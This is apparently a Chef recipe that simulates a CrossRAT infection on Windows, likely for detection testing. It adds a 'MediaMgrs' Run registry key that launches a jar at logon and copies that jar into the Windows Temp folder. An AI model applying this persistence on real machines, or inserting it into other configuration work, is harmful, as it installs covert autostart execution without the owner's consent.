#
# Cookbook:: crossrat_infection
# Recipe:: windows
#
# Copyright:: 2018, The Authors, All Rights Reserved.
registry_key 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' do
  values [{
    name: 'MediaMgrs',
    type: :string,
    data: 'java -jar mediamgrs.jar',
  }]
  action :create
end

cookbook_file 'C:\\Windows\\Temp\\mediamgrs.jar' do
  source 'mediamgrs.jar.txt'
end
